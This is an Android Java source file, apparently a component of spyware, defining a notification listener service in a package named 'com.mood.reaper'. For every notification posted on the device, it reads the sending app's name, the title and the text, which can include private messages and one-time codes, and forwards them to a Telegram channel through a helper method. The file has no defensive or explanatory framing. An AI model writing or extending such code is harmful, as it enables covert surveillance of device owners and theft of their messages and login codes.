package com.mood.reaper;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationCatcher extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");
        Utils.sendToTelegram("🔔 Notif dari " + pkg + "\n📌 " + title + "\n" + text);
    }
}